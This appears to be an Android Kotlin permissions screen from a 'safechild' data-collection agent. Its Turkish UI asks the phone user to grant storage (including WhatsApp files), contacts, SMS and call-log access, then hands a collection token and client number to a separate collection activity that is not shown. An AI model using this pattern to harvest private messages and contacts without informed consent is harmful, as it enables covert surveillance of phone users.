package com.safechild.agent

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.widget.Button
import android.widget.CheckBox
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

/**
 * Handles runtime permission requests
 */
class PermissionsActivity : AppCompatActivity() {

    private var collectionToken: String? = null
    private var clientNumber: String? = null

    private lateinit var storageCheck: CheckBox
    private lateinit var contactsCheck: CheckBox
    private lateinit var smsCheck: CheckBox
    private lateinit var callLogCheck: CheckBox
    private lateinit var continueButton: Button

    // Permission request launcher
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        updateCheckboxes()
        checkAllPermissions()
    }

    // For Android 11+ MANAGE_EXTERNAL_STORAGE
    private val manageStorageLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        updateCheckboxes()
        checkAllPermissions()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_permissions)

        collectionToken = intent.getStringExtra("COLLECTION_TOKEN")
        clientNumber = intent.getStringExtra("CLIENT_NUMBER")

        setupUI()
        updateCheckboxes()
    }

    private fun setupUI() {
        findViewById<TextView>(R.id.titleText).text = "İzinler Gerekli"
        findViewById<TextView>(R.id.descriptionText).text =
            "Verileri toplayabilmek için aşağıdaki izinlere ihtiyacımız var. Her bir izni onaylamak için dokunun."

        storageCheck = findViewById(R.id.storagePermission)
        contactsCheck = findViewById(R.id.contactsPermission)
        smsCheck = findViewById(R.id.smsPermission)
        callLogCheck = findViewById(R.id.callLogPermission)
        continueButton = findViewById(R.id.continueButton)

        storageCheck.text = "Depolama (Fotoğraflar, WhatsApp)"
        contactsCheck.text = "Rehber"
        smsCheck.text = "SMS Mesajları"
        callLogCheck.text = "Arama Geçmişi"

        storageCheck.setOnClickListener { requestStoragePermission() }
        contactsCheck.setOnClickListener { requestPermission(Manifest.permission.READ_CONTACTS) }
        smsCheck.setOnClickListener { requestPermission(Manifest.permission.READ_SMS) }
        callLogCheck.setOnClickListener { requestPermission(Manifest.permission.READ_CALL_LOG) }

        continueButton.setOnClickListener {
            startCollection()
        }

        findViewById<Button>(R.id.requestAllButton).setOnClickListener {
            requestAllPermissions()
        }
    }

    private fun updateCheckboxes() {
        storageCheck.isChecked = hasStoragePermission()
        contactsCheck.isChecked = hasPermission(Manifest.permission.READ_CONTACTS)
        smsCheck.isChecked = hasPermission(Manifest.permission.READ_SMS)
        callLogCheck.isChecked = hasPermission(Manifest.permission.READ_CALL_LOG)
    }

    private fun checkAllPermissions() {
        val hasMinimumPermissions = hasStoragePermission() ||
                hasPermission(Manifest.permission.READ_CONTACTS) ||
                hasPermission(Manifest.permission.READ_SMS) ||
                hasPermission(Manifest.permission.READ_CALL_LOG)

        continueButton.isEnabled = hasMinimumPermissions

        if (hasMinimumPermissions) {
            continueButton.text = "Veri Toplamaya Başla"
        } else {
            continueButton.text = "En az bir izin gerekli"
        }
    }

    private fun hasPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
    }

    private fun hasStoragePermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }

    private fun requestPermission(permission: String) {
        permissionLauncher.launch(arrayOf(permission))
    }

    private fun requestStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = Uri.parse("package:$packageName")
                }
                manageStorageLauncher.launch(intent)
            } catch (e: Exception) {
                val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                manageStorageLauncher.launch(intent)
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionLauncher.launch(arrayOf(
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO
            ))
        } else {
            permissionLauncher.launch(arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE))
        }
    }

    private fun requestAllPermissions() {
        val permissions = mutableListOf<String>()

        if (!hasPermission(Manifest.permission.READ_CONTACTS)) {
            permissions.add(Manifest.permission.READ_CONTACTS)
        }
        if (!hasPermission(Manifest.permission.READ_SMS)) {
            permissions.add(Manifest.permission.READ_SMS)
        }
        if (!hasPermission(Manifest.permission.READ_CALL_LOG)) {
            permissions.add(Manifest.permission.READ_CALL_LOG)
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (!hasPermission(Manifest.permission.READ_MEDIA_IMAGES)) {
                permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            }
            if (!hasPermission(Manifest.permission.READ_MEDIA_VIDEO)) {
                permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
            }
        } else if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            if (!hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE)) {
                permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }

        if (permissions.isNotEmpty()) {
            permissionLauncher.launch(permissions.toTypedArray())
        }

        // Handle MANAGE_EXTERNAL_STORAGE separately for Android 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            requestStoragePermission()
        }
    }

    private fun startCollection() {
        val grantedPermissions = mutableListOf<String>()

        if (hasStoragePermission()) grantedPermissions.add("storage")
        if (hasPermission(Manifest.permission.READ_CONTACTS)) grantedPermissions.add("contacts")
        if (hasPermission(Manifest.permission.READ_SMS)) grantedPermissions.add("sms")
        if (hasPermission(Manifest.permission.READ_CALL_LOG)) grantedPermissions.add("call_log")

        val intent = Intent(this, CollectionActivity::class.java).apply {
            putExtra("COLLECTION_TOKEN", collectionToken)
            putExtra("CLIENT_NUMBER", clientNumber)
            putStringArrayListExtra("GRANTED_PERMISSIONS", ArrayList(grantedPermissions))
        }
        startActivity(intent)
        finish()
    }
}
